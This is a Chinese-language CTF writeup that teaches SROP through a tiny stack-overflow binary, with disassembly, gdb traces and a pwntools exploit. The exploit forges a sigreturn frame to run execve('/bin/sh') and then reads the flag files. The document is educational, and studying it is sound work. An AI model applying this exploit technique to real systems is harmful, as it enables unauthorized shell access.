# pwn1 — `total_recall`（技巧：SROP）

> 這一題是本份 writeup 的「教學主菜」。我假設你**完全沒學過 ROP / SROP**，
> 也**沒寫過 exploit**。所以我會從暫存器、`call`/`ret`、堆疊開始講起，
> 一路講到 SROP 為什麼存在、怎麼用。
>
> 其他題目（pwn2 ~ pwn7）會引用這裡建立的觀念，所以建議先讀完這篇。

---

## 0. 先備知識：這題需要什麼？

| 名詞 | 一句話解釋 |
|---|---|
| `checksec` | 一個工具，用來看一支執行檔開了哪些保護（canary / NX / PIE / RELRO） |
| pwntools | Python 的 CTF pwn 函式庫，`from pwn import *` 之後就有 `process()`、`remote()`、`p64()`、`SigreturnFrame()` 等 |
| gdb | 除錯器，可以看執行到某一行時暫存器與記憶體的實際值 |
| syscall | 程式跟 Linux 核心要服務的方式（開檔、讀寫、執行新程式…） |
| ROP | 用程式裡現成的 `ret` 結尾的小片段（gadget）串起來，做出原本程式沒有的行為 |
| SROP | ROP 的親戚。用 `rt_sigreturn` 這個系統呼叫，一次把**所有暫存器**設成我們要的值 |

### 環境指令

```bash
# 看保護
checksec --file=./challenge
# 或
python3 -c "from pwn import *; print(ELF('./challenge', checksec=False).checksec())"

# 反組譯（Intel 語法比較好讀）
objdump -d -M intel challenge
```

---

## 1. 題目資訊

```
檔案：challenge
ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

`checksec` 的結果：

```
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing   (實際上是 Stack: Executable)
PIE:        No PIE (0x400000)
Stack:      Executable
```

> `NX: NX unknown - GNU_STACK missing` 不是「沒有 NX 保護」的意思，
> 而是**這支 ELF 完全沒有 `GNU_STACK` 這個 program header**
> （`readelf -l challenge` 只列出 2 個 `LOAD`，沒有 `GNU_STACK`）。
> 依核心慣例，缺少 `GNU_STACK` 就代表「**堆疊可執行**」，
> 所以 checksec 最後一行才會是 `Stack: Executable`。

翻譯成人話：

* **No PIE** → 程式碼永遠載入在 `0x400000`，所有函式位址都是固定的，不用洩漏就知道。
* **No canary** → 堆疊溢位可以直接蓋返回位址，不會被偵測。
* **NX 不存在 / Stack Executable** → 堆疊可以執行。
  （其實這題我們可以偷懶：直接寫 shellcode 到堆疊上再跳過去也行。
  但題目名稱 `total_recall` + flag 是 `sun{r3caLl_ev3Ry_reGist3r_sR0p}`
  → 「recall every register」= **SROP 是官方預期解法**。我們照著做。）
* **statically linked** → 沒有 libc 可以洩漏、沒有 `system()`，全部靠自己下 syscall。
* **stripped** → 沒有函式名稱，只能看反組譯。

程式只有 **108 bytes**（0x6c）的 `.text`，是純手工組合語言寫的。

---

## 2. x86-64 最小知識包（沒學過請慢慢看）

### 2.1 暫存器

64 位元模式下有 16 個通用暫存器，每個 8 bytes（64 bits）：

```
rax  rbx  rcx  rdx  rsi  rdi  rbp  rsp  r8  r9  r10  r11  r12  r13  r14  r15
```

名字裡有歷史包袱，但現代 x86-64 只要記住**約定**（System V AMD64 ABI，Linux 用這套）：

| 用途 | 暫存器 |
|---|---|
| 函式第 1~6 個整數參數 | `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` |
| 第 7 個以後的參數 | 放堆疊上 |
| 函式回傳值 | `rax` |
| **系統呼叫編號** | `rax` |
| 系統呼叫的第 1~6 個參數 | `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9`（注意第 4 個是 `r10`，不是 `rcx`！） |
| 系統呼叫回傳值 | `rax` |
| 堆疊指標 | `rsp`（永遠指向堆疊最上面 = 最低位址） |
| 框架指標 | `rbp`（函式的「基準點」，非強制） |
| 指令指標 | `rip`（下一行要執行的位址，不能直接寫） |

子暫存器命名：

```
rax = 64 bits
eax = 低 32 bits
 ax = 低 16 bits
 al = 低 8 bits     (ah = 次 8 bits)
```

`mov eax, 1` 會把 `eax` 設成 1，**同時把 `rax` 的高 32 bits 清成 0**。
`mov al, 1` 只動最低 8 bits。這在堆疊溢位長度控制上常常是關鍵（見 pwn7）。

### 2.2 堆疊

堆疊是「由上往下長」的：位址高的在上面。

```
高位址
        ┌──────────────────┐
        │  ...             │
        ├──────────────────┤  ← rsp 目前在這
        │  剛剛 push 的值  │
        └──────────────────┘
低位址
```

* `push X`：先把 `rsp` 減 8，再把 X 寫到 `[rsp]`。
* `pop  X`：把 `[rsp]` 讀進 X，再把 `rsp` 加 8。
* `call f`：＝ `push 下一行的位址` 然後 `jmp f`。
* `ret`：＝ `pop rip` —— 把 `[rsp]` 當成下一個要執行的位址，`rsp += 8`。

**這就是為什麼「覆蓋返回位址」可以劫持控制流**：只要我們能寫超過區域變數緩衝區的範圍，
寫到 `[rsp]` 上那個返回位址，`ret` 就會跳到我們指定的地方。

### 2.3 Linux x86-64 系統呼叫

呼叫方式固定是：

```
rax = 系統呼叫編號
rdi, rsi, rdx, r10, r8, r9 = 參數
syscall                     ; 執行（注意：是 `syscall` 指令，不是 `call`）
                            ; 回來之後 rax = 回傳值（負數代表 -errno）
```

本題用到的編號：

| 編號 (十進位) | 名稱 | 參數 | 意義 |
|---|---|---|---|
| 0 | `read` | (fd, buf, count) | 從 fd 讀資料 |
| 1 | `write` | (fd, buf, count) | 寫資料到 fd |
| 15 | `rt_sigreturn` | × | **SROP 的關鍵**，下面詳談 |
| 59 | `execve` | (path, argv, envp) | 執行一支程式 |
| 60 | `exit` | (code) | 結束 |

---

## 3. 逐行組語解說（Intel 語法）

完整反組譯只有這些：

```asm
0000000000401000 <.text>:
  401000:  e8 11 00 00 00        call   0x401016     ; (A) 呼叫 leak 函式
  401005:  e8 45 00 00 00        call   0x40104f     ; (B) 呼叫 vuln 函式  ← 有溢位
  40100a:  48 c7 c0 3c 00 00 00  mov    rax,0x3c     ; 60 = __NR_exit
  401011:  48 31 ff              xor    rdi,rdi      ; rdi = 0
  401014:  0f 05                 syscall               ; exit(0)
```

`0x401000` 是進入點（ELF 的 `e_entry`）。注意這裡**沒有 libc 的 `_start`**，
核心載入後直接跳到 `0x401000`。

### 3.1 `0x401016` — leak 函式

```asm
  401016:  54                    push   rsp
  401017:  48 89 e6              mov    rsi,rsp
  40101a:  48 c7 c7 01 00 00 00  mov    rdi,0x1
  401021:  48 c7 c2 08 00 00 00  mov    rdx,0x8
  401028:  48 c7 c0 01 00 00 00  mov    rax,0x1
  40102f:  0f 05                 syscall
  401031:  58                    pop    rax
  401032:  48 8d 74 24 c0        lea    rsi,[rsp-0x40]
  401037:  48 c7 c7 00 00 00 00  mov    rdi,0x0
  40103e:  48 c7 c2 18 00 00 00  mov    rdx,0x18
  401045:  48 c7 c0 00 00 00 00  mov    rax,0x0
  40104c:  0f 05                 syscall
  40104e:  c3                    ret
```

一行一行解釋：

| 位址 | 指令 | 中文說明 |
|---|---|---|
| `0x401016` | `push rsp` | 把「**push 之前**的 `rsp` 值」寫進堆疊。x86 的特性：`push rsp` 壓進去的是遞減前的舊值。 |
| `0x401017` | `mov rsi,rsp` | `rsi` = 目前 `rsp`，也就是「剛剛壓進去那個值的位址」。 |
| `0x40101a` | `mov rdi,1` | `write` 的第 1 個參數 fd = 1（stdout）。 |
| `0x401021` | `mov rdx,8` | 寫 8 bytes。 |
| `0x401028` | `mov rax,1` | 系統呼叫編號 1 = `write`。 |
| `0x40102f` | `syscall` | **`write(1, rsp, 8)`** → 把堆疊位址送到我們眼前。這是「資訊洩漏」。 |
| `0x401031` | `pop rax` | `rax` = 剛剛洩漏的那個位址；`rsp` 加 8 還原。 |
| `0x401032` | `lea rsi,[rsp-0x40]` | `rsi` = `rsp - 0x40`。`lea` 是「算位址放進目的暫存器」，不做記憶體存取。 |
| `0x401037` | `mov rdi,0` | fd = 0（stdin）。 |
| `0x40103e` | `mov rdx,0x18` | 讀 24 bytes。 |
| `0x401045` | `mov rax,0` | 編號 0 = `read`。 |
| `0x40104c` | `syscall` | `read(0, rsp-0x40, 0x18)`。第一次輸入是在這裡被吃掉。 |
| `0x40104e` | `ret` | 返回 `0x401005`。 |

### 3.2 `0x40104f` — vuln 函式（漏洞在這）

```asm
  40104f:  48 8d 74 24 80        lea    rsi,[rsp-0x80]
  401054:  48 c7 c7 00 00 00 00  mov    rdi,0x0
  40105b:  48 c7 c2 00 04 00 00  mov    rdx,0x400
  401062:  48 c7 c0 00 00 00 00  mov    rax,0x0
  401069:  0f 05                 syscall
  40106b:  c3                    ret
```

| 位址 | 指令 | 說明 |
|---|---|---|
| `0x40104f` | `lea rsi,[rsp-0x80]` | 目的地 = `rsp - 0x80`。 |
| `0x401054` | `mov rdi,0` | fd = 0。 |
| `0x40105b` | `mov rdx,0x400` | **讀 0x400 = 1024 bytes！** |
| `0x401062` | `mov rax,0` | `read`。 |
| `0x401069` | `syscall` | `read(0, rsp-0x80, 0x400)` ← **溢位**：只有 `0x80` bytes 到返回位址，卻允許寫 1024 bytes。 |
| `0x40106b` | `ret` | `pop rip` → 跳到我們覆蓋上去的值。 |

### 3.3 用 gdb 驗證堆疊算術（很重要，不要用猜的）

我在 gdb 裡下中斷點實際看到的值：

```
（進入 0x401016 時 rsp = 0x7fffffffdf08）
0x401017  push rsp 之後 :  rsp=0x7fffffffdf00   [rsp]=0x7fffffffdf08
0x401031  pop rax 之後  :  rsp=0x7fffffffdf08   rax=0x7fffffffdf08
0x40104f  進入時        :  rsp=0x7fffffffdf08   [rsp]=0x000000000040100a
0x401054  之後 rsi      :  0x7fffffffde88
0x40106b  ret 前（餵滿 payload）: rsp=0x7fffffffdf08   [rsp]=0x000000000040104f   ← 已經被我們蓋掉了
0x40106b  ret 前（餵 24 bytes） : rsp=0x7fffffffdf08   [rsp]=0x000000000040100a   ← 只有不溢位時才是原值
```

> ⚠️ `0x40106b` 的 `[rsp]` 就是**返回位址那一格**（`buf+0x80`）。用第 6 節的 payload 跑，
> 它會顯示你自己寫進去的 `0x40104f`（這正是「溢位成功」的證據）；想看到原始的 `0x40100a`，
> 就讓 vuln 那次 `read` 什麼都沒收到（例如輸入檔只給 24 bytes，`read` 回傳 0，就不會覆蓋）。

由此得到兩個關鍵數字：

```
leak  = 0x7fffffffdf08              ← write 洩漏的值
buf   = 0x7fffffffde88 = leak - 0x80 ← vuln 的讀取緩衝區
返回位址在 buf + 0x80               ← 溢位 offset 就是 0x80
```

**這就是 exploit 裡 `buf = leak - 0x80` 和 `b"B"*0x80` 的來源。**

#### 怎麼自己重現這張表？（可直接複製）

> ASLR 每次的位址都不一樣，所以你自己跑出來的數字跟上面**不會一樣**。
> 重點是**差值**：`第二次 rsi - 第一次 rsi = 0x08`、`rax=15 那次的 rsp - 第一次 rsi = 0x90`。
> （上面表格的 `0x7fffffffdf08` / `0x7fffffffde88` 是同一輪 gdb 的數字；你自己跑會拿到別的位址，
> 但**相減的差值一定一樣**。）

先做一個輸入檔：

```python
# make_input.py
from pwn import *
context.arch = 'amd64'
f = SigreturnFrame(); f.rip = 0x401069; f.rax = 59; f.rsp = 0x4141414141414141
payload  = b'B'*0x80 + p64(0x40104f) + p64(0x401069) + bytes(f)
payload  = payload.ljust(0x400, b'\x00')
open('/tmp/in.bin','wb').write(b'A'*0x18 + payload + b'/bin/sh\x00' + b'C'*7)
```

再存一個 gdb 腳本（`/tmp/t.gdb`）—— 這個版本會在**上面表格的每一列**都停下來印值：

```gdb
set pagination off
set confirm off
# ⚠️ gdb 的 `-x` 腳本「不支援行內註解」（`b *0x401016  # 註解` 會報
#    `Invalid character '#' in expression`），所以註解都獨立放一行。
# (1) 進入 leak 函式
b *0x401016
# (2) push rsp 之後
b *0x401017
# (3) pop rax 之後
b *0x401032
# (4) 進入 vuln
b *0x40104f
# (5) lea rsi,[rsp-0x80] 之後
b *0x401054
# (6) vuln 的 ret 前（就是返回位址那一格）
b *0x40106b
# (7) 每一條 syscall（含 rt_sigreturn 那次）
b *0x401069
# sigreturn 後 rsp 會被改成 0x4141…（無效位址），那時不要停在第 6 個中斷點
condition 6 $rsp < 0x800000000000
commands 1
  printf "[0x401016 進入 leak]     rsp=%#lx\n", $rsp
  continue
end
commands 2
  printf "[0x401017 push rsp 之後] rsp=%#lx   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 3
  printf "[0x401032 pop rax 之後]  rsp=%#lx   rax=%#lx\n", $rsp, $rax
  continue
end
commands 4
  printf "[0x40104f 進入 vuln]     rsp=%#lx   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 5
  printf "[0x401054 之後 rsi]      rsi=%#lx\n", $rsi
  continue
end
commands 6
  printf "[0x40106b ret 前]        rsp=%#lx   [rsp]=%#lx\n", $rsp, *(unsigned long*)$rsp
  continue
end
commands 7
  printf "[0x401069 syscall]       rsp=%#lx   rax=%lu\n", $rsp, $rax
  continue
end
run < /tmp/in.bin
```

```bash
gdb -q -batch -x /tmp/t.gdb ./challenge
```

實跑輸出（位址每次不同，這裡節錄）：
```
[0x401016 進入 leak]     rsp=0x7fffffffdf18
[0x401017 push rsp 之後] rsp=0x7fffffffdf10   [rsp]=0x7fffffffdf18
[0x401032 pop rax 之後]  rsp=0x7fffffffdf18   rax=0x7fffffffdf18
[0x40104f 進入 vuln]     rsp=0x7fffffffdf18   [rsp]=0x40100a
[0x401054 之後 rsi]      rsi=0x7fffffffde98
[0x401069 syscall]       rsp=0x7fffffffdf18   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf18   [rsp]=0x40104f   ← 已被我們的 payload 蓋掉
[0x40104f 進入 vuln]     rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401054 之後 rsi]      rsi=0x7fffffffdea0                     ← 比上面多 0x08
[0x401069 syscall]       rsp=0x7fffffffdf20   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401069 syscall]       rsp=0x7fffffffdf28   rax=15           ← rax=15 就是 rt_sigreturn
[0x401069 syscall]       rsp=0x4141414141414141   rax=59       ← frame 裡設的 rsp 與 rax
```

怎麼讀這份輸出：

* `0x401069` 被命中 **4 次**：vuln 的第一次 read、被 `ret` 跳回來的第二次 read、
  `rax=15` 的 `rt_sigreturn`、以及 sigreturn 還原後又跳回 `rip=0x401069` 的那次
  （最後那次 `rsp` 會變成 frame 裡設定的值，本範例是 `0x4141414141414141`）。
* `[0x40104f 進入 vuln]` 的 `[rsp]` 是 `0x40100a`（第二次是 `0x401069`）—— 那是 `call vuln`
  壓進去的返回位址。
* `[0x40106b ret 前]` 的 `[rsp]` 就是**返回位址那一格**：餵了溢位 payload 之後它變成我們寫的
  `0x40104f`（「溢位成功」的證據）。想看到原始值 `0x40100a`，就把輸入縮成 24 bytes
  （`read` 回傳 0，不覆蓋）。

---

## 4. 漏洞總結

```
read(0, rsp-0x80, 0x400)   // 緩衝區只有 0x80 bytes 到返回位址
```

* `0x80` bytes 之後就是返回位址 → 可以跳到任意位址。
* `0x400` bytes 的空間也讓我們可以在堆疊上放**假的資料結構**（SROP 的 frame）。
* 沒有 canary、沒有 PIE、又是靜態連結 → 沒有隨機化干擾。

一般來說，下一步就是「ROP」：找 `pop rdi; ret`、`pop rsi; ret` … 把參數塞好，
然後 `ret` 到 `syscall` 做 `execve("/bin/sh", 0, 0)`。

**但這題沒有那些 gadget。**

看看整支程式有哪些指令：

```
0x401016: push rsp
0x401031: pop rax        ← 唯一的 pop
0x401069: syscall; ret   ← 我們用的 gadget（本題其實有「兩個」syscall; ret，見下方）
```

> 整支程式其實有 **4 條 `syscall`**：`0x401014`（`exit`）、`0x40102f`（`write`）、
> `0x40104c`（leak 裡的 `read`）、`0x401069`（vuln 裡的 `read`）。
> 我們要的是「**執行完 syscall 之後還能 `ret` 回我們的鏈**」，所以只挑「後面緊接著 `ret`」的。
>
> 自己驗一次（很重要，這句以前寫錯過）：
>
> ```bash
> objdump -d -M intel challenge | grep -A1 syscall
> ```
>
> ```asm
>   40104c: 0f 05      syscall
>   40104e: c3         ret      ← 這裡也是 syscall; ret
>   ...
>   401069: 0f 05      syscall
>   40106b: c3         ret      ← 本題用的是這個
> ```
>
> 所以「`syscall; ret`」有**兩個**位置，`0x40104c` **不是**不能用：
> 直接跳進 `0x40104c` 時，前面那條 `mov rax,0`（`0x401045`）不會被執行，
> 所以 `rax` 由我們自己決定 —— 本機實測把它當 `SYSCALL_RET` 用（連同 frame 的 `rip`）
> 一樣能拿到 flag。
> **本題選 `0x401069` 的真正理由**（在反組譯裡看得到）：
>
> 1. `0x401069` **就是我們控制的那次 `read` 自己的 `syscall`**
>    （`vuln` @ `0x40104f`：`read(0, rsp-0x80, 0x400)` → `0x401069: syscall`）。
>    `read` 的回傳值放在 `rax`，我們故意只送 15 bytes ⇒ `rax = 15`；
>    而緊接著 `0x40106b` 的 `ret` 又是我們溢位時**直接蓋掉的那一格**（見 §6 步驟 3 的 payload 圖）。
>    ⇒「`rax = 15` → 執行 `syscall`」中間不需要任何額外指令或跳轉，全部連成一線。
> 2. `0x40104c` 屬於 `0x401016` 那個 leak 函式，它的 `ret`（`0x40104e`）之後程式會**繼續跑回
>    `0x401005: call vuln`** —— 也就是又進到那個會 `read` 0x400 bytes 的溢位點；
>    `0x401069` 則是 `vuln` 的**最後一條指令**，`ret` 之後控制權完全交給我們放在堆疊上的位址，
>    行為最好預測、讀起來最乾淨。
>
> 這段就是「gadget 必須以 `ret` 結尾」的實例：`syscall` 本身不會把控制權交回來，
> 只有它後面那條 `ret` 才會去讀堆疊上的下一個位址。**結論用「唯一」兩個字之前，先 grep 一次。**

只有一個 `pop rax`（而且它 pop 完馬上被後面的 `mov rax,0` 蓋掉），
**沒有任何 `pop rdi` / `pop rsi` / `pop rdx`**。

所以在這裡，普通的 ROP 沒辦法設定 `execve` 所需的 `rdi`（`/bin/sh` 位址）、
`rsi`、`rdx`。這就是 SROP 登場的時候。

---

## 5. SROP 原理（Sigreturn Oriented Programming）

### 5.1 `rt_sigreturn` 是什麼

先把四個很容易混的名字分清楚：

| 名字 | 是什麼 |
|---|---|
| `rt_sigframe` | 核心放在使用者堆疊上的「整包」結構（除了暫存器，還含 `siginfo`、`pretcode` 等欄位，**整體比 `0xf8` 大**），由 `ucontext` 開頭 |
| `ucontext` | `rt_sigframe` 的前半段，包含 `uc_flags`、`uc_link`、`uc_stack`（佔 5 個 8-byte 欄位 = 0x28 bytes） |
| `struct sigcontext` | 緊接在後面、真正存「所有暫存器」的那段，`r8` 從 offset **0x28** 開始 |
| `sigframe`（本筆記的簡稱） | 就是 pwntools `SigreturnFrame()` 產生的那 **0xf8 bytes**（`len(bytes(SigreturnFrame())) == 248`）；本題直接把它整包塞在堆疊上 |

> ⚠️ 別把「`0xf8`」當成核心那一整包的大小：`0xf8` 是 **pwntools `SigreturnFrame()` 的長度**，
> 也就是「**我們自己要寫上堆疊的那一段**」（`ucontext` + `sigcontext`）。
> 核心真正的 `struct rt_sigframe` 還包含 `pretcode`、`siginfo`（128 bytes）等欄位，比 `0xf8` 大。
> 我們不需要自己算那些欄位要填什麼：只要把 pwntools 給的這 `0xf8` bytes 放在 `rsp` 指到的地方
> （本題是 `buf+0x90`），核心就會正確地把暫存器還原成我們要的值 —— 這一點本題實測可跑。

Linux 在處理 signal（例如 Ctrl-C 的 SIGINT）時，流程是：

1. 核心把「被打斷時的所有暫存器值 + signal mask + …」打包成一個結構
   **`rt_sigframe`**，壓在使用者堆疊上。
2. 核心跳到使用者註冊的 signal handler。
3. handler 執行完後呼叫 `rt_sigreturn`（編號 15）。
4. 核心把 (1) 存下來的那包東西**全部還原到 CPU 暫存器**，程式若無其事地繼續跑。

注意第 4 步：**核心會無條件相信堆疊上的那份 frame**。
如果我們能控制堆疊內容、又能讓 `rax = 15` 之後執行 `syscall`，
那就等於「一次設定 rdi / rsi / rdx / rsp / rip … 全部暫存器」——
這正是普通 ROP 做不到的事。

### 5.2 我們需要湊出什麼

```
1. 讓 rax = 15
2. 執行 syscall（＝ rt_sigreturn）
3. 讓 rsp 指向我們偽造的 sigframe
4. 核心還原暫存器：
      rdi = "/bin/sh" 的位址
      rsi = 0
      rdx = 0
      rip = syscall 指令的位址
      rax = 59 (__NR_execve)
5. 執行到 rip，`syscall` 帶 rax=59 → execve("/bin/sh", NULL, NULL) → 得到 shell
```

### 5.3 frame 長什麼樣

`rt_sigreturn` 讀的結構在 x86-64 是 `struct rt_sigframe`，
前面是 `ucontext`，其中包含 **`struct sigcontext`**。
我直接用 pwntools 產生一個 `SigreturnFrame` 並量出每個欄位的偏移：

```
整個 frame 長度 = 0xf8 (248 bytes)

偏移   大小   欄位          備註
0x00   8     uc_flags      ┐
0x08   8     &uc           │ ucontext 的前置部分
0x10   8     ss_sp         │ （kernel 不怎麼看，填 0 即可）
0x18   8     ss_flags      │
0x20   8     ss_size       ┘
───────────────────────────  ← struct sigcontext 從這裡開始
0x28   8     r8
0x30   8     r9
0x38   8     r10
0x40   8     r11
0x48   8     r12
0x50   8     r13
0x58   8     r14
0x60   8     r15
0x68   8     rdi           ★ execve 第 1 個參數
0x70   8     rsi           ★ 第 2 個
0x78   8     rbp
0x80   8     rbx
0x88   8     rdx           ★ 第 3 個
0x90   8     rax           ★ 系統呼叫編號 (execve = 59)
0x98   8     rcx
0xa0   8     rsp           ★ 還原後的堆疊指標
0xa8   8     rip           ★ 還原後要跳去哪
0xb0   8     eflags
0xb8   8 (用到 6)  csgsfs     cs/gs/fs 各 2 bytes + 2 bytes padding，所以 err 從 0xc0 開始
0xc0   8     err
0xc8   8     trapno
0xd0   8     oldmask
0xd8   8     cr2
0xe0   8     &fpstate
0xe8   8     __reserved
0xf0   8     sigmask
```

**好消息**：pwntools 有 `SigreturnFrame()`，我們只要設欄位，它會幫我們排出正確的 bytes：

```python
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = sh_addr     # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET # syscall 指令的位址
frame.rsp = 某個合法位址  # 還原後 rsp 的值（本題用 sh_addr + 0x200；理由見第 6 節步驟 5）
payload += bytes(frame)   # 直接轉成 bytes（長度 0xf8）
```

> ⚠️ 注意：`rt_sigreturn` 也會還原 `cs`/`ss`/`eflags` 等。
> 用 pwntools 產生的 frame 會填好合理的預設值（實測 `bytes(frame)[0xb8:0xc0]` =
> `33 00 00 00 00 00 00 00`，也就是 `cs = 0x33` = 64-bit user code segment、`gs`/`fs` = 0 ——
> x86-64 的 `sigcontext` 只用到 `cs`/`gs`/`fs` 三個 u16，**沒有 `0x2b` 這種 32-bit 相容模式的
> segment**，不要自己多填一個值）。
> 另外核心會檢查 `cs == 0x33`（64-bit user code segment）這類條件，
> 若 frame 有問題會直接送 SIGSEGV 把程式殺掉。所以**不要自己去改沒必要的欄位**。
>
> 🔴 **最常見的錯誤**：把「sigcontext 的偏移」直接當成「frame 的偏移」。
> `rdi` 在 frame 裡是 **0x68**，不是 0x40（0x40 是 `r11`）。
> 如果手刻 frame 就要用上表的絕對偏移；用 `SigreturnFrame` 就不用管。

---

## 6. Exploit 逐行解說

完整程式在 `pwn1/exploit.py`。核心段落：

### 步驟 1：洩漏堆疊位址

```python
leak = u64(p.recv(8).ljust(8, b"\x00"))   # 讀 8 bytes，補齊成 64-bit 整數
buf  = leak - 0x80                        # vuln 的緩衝區位址
```

`u64()` 是 pwntools 的「little-endian 解 8 bytes 成整數」；
洩漏出來的值是 **`0x401016` 那個 leak 函式**用 `push rsp` + `write(1, rsp, 8)` 印出來的
（跟 `sigreturn` 無關，`sigreturn` 是後面才用到的技巧）。
它等於 `R0-8`，其中 **`R0` = `_start` 第一道指令執行時的 `rsp`**（本題 `leak = R0-8`），
而 vuln 的緩衝區 = `R0-0x88`，兩者差正好 `0x80`。

### 步驟 2：第一次 `read`

```python
p.send(b"A" * 0x18)
```

這是被 `0x401032` 的 `read(0, rsp-0x40, 0x18)` 吃掉的，只是墊檔，不影響控制流。

### 步驟 3：組出第一段 payload

```python
payload  = b"B" * 0x80            # 填滿緩衝區，剛好碰到返回位址
payload += p64(VULN_READ)         # 覆蓋返回位址 -> 回到 0x40104f
payload += p64(SYSCALL_RET)       # 這次 read 的 ret 會跳到 0x401069 (syscall; ret)
payload += bytes(frame)           # 偽造的 sigframe
payload  = payload.ljust(SH_OFF, b"\x00")
payload += b"/bin/sh\x00"         # 字串放在同一個 buffer 裡 (位址已知)
payload  = payload.ljust(0x400, b"\x00")
p.send(payload)
```

> ⚠️ **為什麼 `payload.ljust(0x400)` 不能省？**
> `read()` 不像 `scanf` 會等到你按 Enter，它是「核心目前手上有多少就給你多少」。
> `vuln` 的 `read(0, buf, 0x400)` 最多吃 0x400 bytes：
> * 你送**超過** 0x400 → 多出來的會留在管線裡，被「下一次 `read`」先吃掉，
>   那次的 `rax` 就不是 15，SROP 直接失敗（而且除錯訊息是「莫名 SIGSEGV」）。
> * 你送**不足** 0x400 → 這次 `read` 早退，`rax` 會是別的數字（不影響流程，
>   但後面「剛好 15 bytes」的那次一定要獨立送）。
> 所以本題的送法固定是：**先送完整 0x400 的第一段 payload，再單獨送剛好 15 bytes**。
> 兩者之間不需要 `recv`，因為核心會按順序交付。

執行流程（第一輪）：

整題總共只有 **3 次 read、3 次 send**（第 1 次 send 是墊檔的 24 bytes，
第 2、3 次才是 payload 的兩段），順序如下（一定要照這個順序）：

| 次數 | 程式在哪個 read | 我們送什麼 | 送完之後 `rax` |
|---|---|---|---|
| 1 | `0x40104c` `read(0, rsp-0x40, 0x18)`（leak 函式裡，先墊掉） | `b"A"*0x18`（24 bytes） | 0x18（不重要） |
| 2 | `0x40104f` `read(0, buf, 0x400)`（`_start` 直接呼叫的 vuln） | **第一段 payload**：`b"B"*0x80` + `VULN_READ` + `SYSCALL_RET` + `frame` + `"/bin/sh"`（補滿 0x400） | 0x400（會被覆蓋） |
| — | `0x40106b` 的 `ret` 彈掉我們蓋上去的 `VULN_READ`，跳回 `0x40104f` | | |
| 3 | `0x40104f` 再次 `read(0, buf+0x08, 0x400)` | **只送 15 bytes**：`b"/bin/sh\x00" + b"C"*7` | **15 = `__NR_rt_sigreturn`** |
| — | `0x40106b` 的 `ret` 彈掉 `SYSCALL_RET`（＝ `0x401069`），此時 **`rsp = buf+0x90`** | | |
| — | `0x401069` 的 `syscall`：`rax=15` → 核心從 `rsp = buf+0x90` 讀 sigframe | | |

```
payload 在記憶體裡的樣子（buf = leak - 0x80）：

buf+0x000  ┌─────────────────────────────────┐
           │ B B B B ... （0x80 bytes 垃圾） │  ← 第二次 read 的 15 bytes 會蓋在 buf+0x08
buf+0x080  ├─────────────────────────────────┤
           │ 0x40104f  ← 覆蓋掉的返回位址    │  ← vuln 的 ret 跳到這裡
buf+0x088  ├─────────────────────────────────┤
           │ 0x401069  ← 下一次 ret 的目標   │
buf+0x090  ├─────────────────────────────────┤
           │ SigreturnFrame (0xf8 bytes)     │  ← rt_sigreturn 就從這裡讀！
buf+0x188  ├─────────────────────────────────┤
           │ （padding）                     │
buf+0x1a0  ├─────────────────────────────────┤
           │ "/bin/sh\x00"                   │  ← frame.rdi 指向這裡
buf+0x400  └─────────────────────────────────┘
```

**關鍵細節：`rsp` 的位置。**

```
ret 到 0x40104f 的時候  rsp = buf + 0x88
0x40104f 讀進來的資料從    buf + 0x08 開始（因為此刻 rsp = buf+0x88，rsi = rsp-0x80）
0x40106b 的 ret         pop 掉 buf+0x88 的值，rsp 變成 buf + 0x90
```

> 所以第二次那 15 bytes 會蓋在 `buf+0x08`~`buf+0x16`，也就是第一段 payload 的 padding 區，
> 不會碰到 `buf+0x90` 的 sigframe —— 這才是「送 15 bytes 是安全的」的真正理由。
> （不是「它落在 `buf+0x00`」，而是它落在 **`buf+0x08`**，兩者都能碰到 sigframe 之前就停住。）

所以我們把 `SYSCALL_RET` 放在 `buf+0x88`（payload 的第 2 個 qword），
就會在那一刻 `ret` 過去，而此時 **`rsp = buf + 0x90`**。
`sigframe` 必須正好從 `rsp` 開始 → 所以 `FRAME_OFF = 0x90`。

```python
FRAME_OFF = 0x90
SH_OFF    = 0x1A0     # frame 約 248 bytes，擺在 0x90；字串放 0x1A0 不會打架
frame_addr = buf + FRAME_OFF
sh_addr    = buf + SH_OFF
```

### 步驟 4：讓 `rax = 15`

```python
p.send(b"/bin/sh\x00" + b"C" * 7)   # 剛好 15 bytes
```

`read()` 的回傳值就是實際讀到的 byte 數，而 `syscall` 的回傳值放在 `rax`。
所以**送剛好 15 bytes**，`rax` 就會是 15 = `__NR_rt_sigreturn`。

> 這 15 bytes 會被寫到 `rsp-0x80`，此時 `rsp = buf+0x88`，所以目的地是 **`buf+0x08`**
> （也就是第一段 payload 前段的 padding 區），不會碰到 `buf+0x90` 的 sigframe，安全。

### 步驟 5：還原暫存器並執行 execve

```
核心收到 syscall(15) → 從 rsp = buf+0x90 讀 sigframe
   rax = 59, rdi = &"/bin/sh", rsi = 0, rdx = 0
   rip = 0x401069 (syscall; ret)
   rsp = sh_addr + 0x200
   ↓
執行到 rip → syscall 帶著 rax=59 → execve("/bin/sh", NULL, NULL)
   ↓
shell！ (execve 成功後整個行程被換掉，後面的 ret 不會執行)
```

> 💡 **`frame.rsp` 為什麼是 `sh_addr + 0x200`？**
> `frame.rsp` 只要是「**合法、可寫**的位址」就好：`execve` 成功的話根本用不到它
> （行程映像整個被換掉），失敗時核心才會拿它當堆疊繼續跑。
> 本題取 `sh_addr + 0x200 = buf + 0x1a0 + 0x200 = buf + 0x3a0`，
> 仍然落在我們那 0x400 bytes 的輸入區裡面，所以一定合法
> （`0x3a0 < 0x400`，而且不會蓋到 `0x1a0` 的 `"/bin/sh"`）。

### 步驟 6：取 flag

```python
time.sleep(0.5)                    # 等 shell 起來
p.sendline(b"cat flag.txt /flag /home/*/flag.txt 2>/dev/null; id; echo DONE")
